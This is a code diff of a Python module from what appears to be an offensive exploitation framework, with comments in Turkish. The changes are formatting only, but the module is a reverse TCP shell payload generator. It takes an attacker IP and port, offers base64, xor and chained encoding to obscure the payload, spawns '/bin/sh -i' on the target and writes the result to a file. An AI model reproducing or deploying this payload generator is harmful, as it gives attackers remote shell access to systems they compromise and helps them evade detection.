@@ -1,12 +1,15 @@
+from typing import Any
+
 from core.module import BaseModule
 from core.option import Option
-from typing import Dict, Any
+
 
 class Payload(BaseModule):
     """
     Python Shell Reverse TCP Payload.
     Hedef sistemde çalıştırıldığında bize shell bağlantısı gönderir.
     """
+
     Name = "Python Shell Reverse TCP"
     Description = "Python tabanlı Reverse TCP Shell."
     Author = "Mahmut P."
@@ -17,8 +20,19 @@ class Payload(BaseModule):
         self.Options = {
             "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak IP (Saldırgan)."),
             "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
-            "ENCODE": Option("ENCODE", "None", False, "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir)."),
-            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: /tmp/shell.py).", completion_dir=".")
+            "ENCODE": Option(
+                "ENCODE",
+                "None",
+                False,
+                "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir).",
+            ),
+            "OUTPUT": Option(
+                "OUTPUT",
+                "",
+                False,
+                "Payload'ı dosyaya kaydet (örn: /tmp/shell.py).",
+                completion_dir=".",
+            ),
         }
 
     def generate(self) -> str:
@@ -38,17 +52,18 @@ subprocess.call(["/bin/sh","-i"])
 """
         encode_type = self.get_option_value("ENCODE")
         from core.encoders.manager import apply_encoding
+
         return apply_encoding(raw_payload.strip(), encode_type)
 
-    def run(self, options: Dict[str, Any]):
+    def run(self, options: dict[str, Any]):
         """Payload oluştur ve ekrana bas/kaydet."""
         code = self.generate()
-        
+
         output_path = self.get_option_value("OUTPUT")
         if output_path:
             if not output_path.endswith(".py"):
                 output_path += ".py"
-                
+
             try:
                 with open(output_path, "w") as f:
                     f.write(code)
